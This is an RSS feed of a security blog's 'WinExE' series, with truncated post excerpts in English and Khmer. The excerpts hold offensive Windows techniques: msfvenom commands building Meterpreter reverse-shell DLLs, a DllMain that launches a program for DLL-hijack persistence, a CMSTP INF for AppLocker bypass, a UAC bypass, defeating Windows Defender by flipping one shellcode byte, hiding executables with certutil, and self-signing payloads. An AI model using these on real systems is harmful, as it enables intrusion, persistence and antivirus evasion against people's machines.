<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>WinExE on ThikLab - CyberSec</title>
    <link>https://thiklab.com/en/series/winexe/</link>
    <description>Recent content in WinExE on ThikLab - CyberSec</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2022 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
    <lastBuildDate>Mon, 24 Oct 2022 21:01:06 +0700</lastBuildDate>
    
        <atom:link href="https://thiklab.com/en/series/winexe/index.xml" rel="self" type="application/rss+xml" />
    

      
      <item>
        <title>Impersonate SSL Meterpreter Bypass</title>
        <link>https://thiklab.com/en/posts/impersonate-ssl-meterpreter-bypass/</link>
        <pubDate>Mon, 24 Oct 2022 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Mon, 24 Oct 2022 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/impersonate-ssl-meterpreter-bypass/</guid>
        <description>Clone SSL Certification By using a module developed by Chris John Riley, we can clone all the SSL certificate files of an authenticated source. The local certificate is created in PEM format. It can be used in all the modules of Metasploit where SSLCert option is given.
So now, first we will generate the certificate using the module by typing the following commands.
1 2 3  use auxiliary/gather/impersonate_ssl set rhosts https://example.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>metasploit</category>
            
          
            
              <category>ssl</category>
            
          
            
              <category>bypass</category>
            
          
            
              <category>reverseshell</category>
            
          
        
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Evading Win Defender With 1 Byte Change</title>
        <link>https://thiklab.com/en/posts/evading-1-byte-change/</link>
        <pubDate>Wed, 28 Sep 2022 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Wed, 28 Sep 2022 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/evading-1-byte-change/</guid>
        <description>1 Byte Evading Let&amp;rsquo;s generate a CobaltStrike c shellcode.
Note that the first byte of the shellcode is \xfc.
Let&amp;rsquo;s put the shellcode we got into the launcher, but with a small twist.
Change \xfc to any other byte value. I choose \xfdStore the correct first byte \xfc in a char variableBefore copying the full shellcode to the newly allocated memory, flip the bad byte \xfd with a good one \xfcBuild the executableBelow is the source code if you want to test it in your environment.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>cobaltstrike</category>
            
          
            
              <category>reverseshell</category>
            
          
            
              <category>c-shellcode</category>
            
          
        
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>DLL Hijacking - Persistence Method</title>
        <link>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</link>
        <pubDate>Mon, 19 Sep 2022 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Mon, 19 Sep 2022 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</guid>
        <description>C - Execute Command Prompt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;windows.h&amp;gt;using namespace std; void exec() { WinExec(&amp;#34;cmd.exe /c c:\\programdata\\putty.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }   DLL Build In terminal type below command.
1 2 3 4 5 6 7 8  // To create Windows executables, you need to instsall mingw cross-compiler sudo apt-get install mingw-w64 //For x64 compile with: x86_64-w64-mingw32-gcc r4t.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>dll</category>
            
          
            
              <category>reverseshell</category>
            
          
            
              <category>persistence</category>
            
          
        
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>AppLocker Bypass - CMSTP</title>
        <link>https://thiklab.com/en/posts/applocker-bypass-cmstp/</link>
        <pubDate>Wed, 04 Aug 2021 02:00:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Wed, 04 Aug 2021 02:00:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/applocker-bypass-cmstp/</guid>
        <description>ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវិនដូ៖
1 2  C:\Windows\System32\cmstp.exe C:\Windows\SysWOW64\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង blog របស់គាត់។
DLL Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។
1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &amp;gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។
1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\Users\Victim\idm.dll [Strings] AppAct = &amp;#34;SOFTWARE\Microsoft\Connection Manager&amp;#34; ServiceName=&amp;#34;idm&amp;#34; ShortSvcName=&amp;#34;idm&amp;#34;   រក្សាទុកជា &amp;ldquo;idm-service.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>dll</category>
            
          
            
              <category>bypass</category>
            
          
            
              <category>inf</category>
            
          
            
              <category>sct</category>
            
          
        
        
          
            
              <category>CMSTP</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Bypass UAC DLL Method</title>
        <link>https://thiklab.com/en/posts/bypass-uac-dll-method/</link>
        <pubDate>Wed, 04 Aug 2021 02:00:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Wed, 04 Aug 2021 02:00:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/bypass-uac-dll-method/</guid>
        <description>ដើម្បីធ្វើការ Bypass ទៅលើ UAC នៅរាល់ប្រព័ន្ធប្រតិបត្តិការវិនដូជំនាន់ថ្មី (៨/១០/១១) យើងអាចប្រើប្រាស់ឯកសារ ps1 ដើម្បីបង្កើតចេញជា dll reflection ដែលអាច exploit តាមរយៈឯកសារដើម cmstp.exe នៃប្រព័ន្ធគោលពីរ។
C# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100  /* UAC Bypass using CMSTP.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>dll</category>
            
          
            
              <category>bypass</category>
            
          
        
        
          
            
              <category>UAC</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Run DLL Payloads</title>
        <link>https://thiklab.com/en/posts/run-dll/</link>
        <pubDate>Sat, 24 Apr 2021 21:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Sat, 24 Apr 2021 21:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/run-dll/</guid>
        <description>Generate DLL Payload In penetration testing system open terminal and type.
1  msfvenom -p windows/meterpreter/reverse_tcp lhost=128.x.x.x lport=4455 -b &amp;#39;\x00\xff&amp;#39; -f dll &amp;gt; idm.dll   Run DLL In windows 7/8/10 open CMD and type.
1  cmd&amp;gt; c:\Windows\System32\rundll32.exe c:\Users\Zyzz\Desktop\idm32.dll,xoxo   The tricks is to put the *,xoxo* or any strings after *.dll* file, if not the file will not work.
Get Reverse Shell Go back to metasploit and get the shell.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>dll</category>
            
          
            
              <category>metasploit</category>
            
          
            
              <category>reverseshell</category>
            
          
        
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Convert ExE To Text File</title>
        <link>https://thiklab.com/en/posts/convert-exe-to-txt/</link>
        <pubDate>Sat, 24 Apr 2021 10:01:06 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Sat, 24 Apr 2021 10:01:06 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/convert-exe-to-txt/</guid>
        <description>The idea is to store an exe file as a text format and download from the cloud.
Certutil Encode In windows 7/8/10 open CMD and type.
1  cmd&amp;gt; certutil -encode file.exe file.txt   This will encrypt the file as base64 into a text format.
After encrypted the file will look like this.
1 2 3 4 5 6 7 8  -----BEGIN CERTIFICATE----- TVp4AAEAAAAEAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA m21gKiFxNcsclCLVL6Q01cECa/UD1Am02MYPaESJirs/s/5l1TKlKGnQQLTZymuI 1ZJiqgSCbkCdi1scpPQEk+IVPuYnVa91h1qWPA4PO/G2K4M7lQqRrGdQ57i3A+yM v+8J1Zx3eaAnAxpg0FDfzyrUVS4Wc45KE9FVEJTyk706+qFXhvey4pGUSFkH1obG g3mE2SaLGbMQPkC95pNe/vfqyQ4MFgulk1HcL9XA3AyprIVj2H0ve91ip0aeIcOC rzno9vOnK3OrUKUVl9CK2s56VsHUAjmreyKs6cyUxfWUDI6is3NxuSR8AAAAAAAA -----END CERTIFICATE-----   Certutil Decode To decode the file just type.</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>converter</category>
            
          
        
        
          
            
              <category>FUD</category>
            
          
            
              <category>CA</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      
      <item>
        <title>Self Signed Certification</title>
        <link>https://thiklab.com/en/posts/self-signed-certification/</link>
        <pubDate>Tue, 02 Jun 2020 16:22:34 +0700</pubDate>
        <author>thiklife403@gmail.com (Thik)</author>
        <atom:modified>Tue, 02 Jun 2020 16:22:34 +0700</atom:modified>
        <guid>https://thiklab.com/en/posts/self-signed-certification/</guid>
        <description>តើមានវិធីអ្វីដែលអាចចុះហត្ថលេខាលើកូដទៅឲ្យកម្មវិធី ឫ Payload ដែលយើងបានបង្កើតឡើងដោយខ្លួនឯងរួច?
ខាងក្រោមនេះគឺជាវិធីដ៏ល្អមួយសម្រាប់ចម្លើយនៃសំនួរខាងលើ៖
Generate the Key 1 2  # Make sure you run as Administrator New-SelfSignedCertificate -DnsName email@yourdomain.com -Type CodeSigning -CertStoreLocation cert:\CurrentUser\My   Export Certification Without Private Key 1  Export-Certificate -Cert (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert)[0] -FilePath code_signing.crt   ចំពោះលេខ [0] គឺសម្រាប់ករណីនៅពេលដែលយើងមាន certificate ច្រើនជាងមួយ។
Import as Trusted Publisher 1  Import-Certificate -FilePath .\code_signing.crt -Cert Cert:\CurrentUser\TrustedPublisher   Import as Root Certificate Authority 1  Import-Certificate -FilePath .</description>
        
        <dc:creator>thik</dc:creator>
        <media:content url="https://thiklab.comimages/feature3/ca.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>code-signing</category>
            
          
        
        
          
            
              <category>CA</category>
            
          
        
        
          
            
              <category>WinExE</category>
            
          
        
      </item>
      

    
  </channel>
</rss>
